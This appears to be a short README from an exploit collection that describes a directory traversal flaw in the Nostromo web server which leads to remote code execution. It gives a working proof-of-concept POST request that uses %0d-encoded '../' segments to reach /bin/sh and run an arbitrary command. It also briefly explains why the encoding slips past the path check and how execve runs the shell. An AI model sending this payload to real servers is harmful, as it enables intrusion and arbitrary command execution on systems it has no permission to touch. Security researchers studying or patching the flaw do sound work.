# Exploit_Webapps

Nostromo suffers from a Directory Traversal vulnerability , which can further be escalated to a Remote Code Execution.

POC:-

Sending a POST Request on: /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0
                           Content-Length: 1
                           
                           <command>
                          
Why %0d?
  
   The function http_verify() in the webapp first URLdecodes the URI.
   
How RCE is possible?
  
   The function execve() in the function http_proc() executes rh->rq_filef,
   Thus the path /../../../../bin/sh executes and we get a jailed shell.
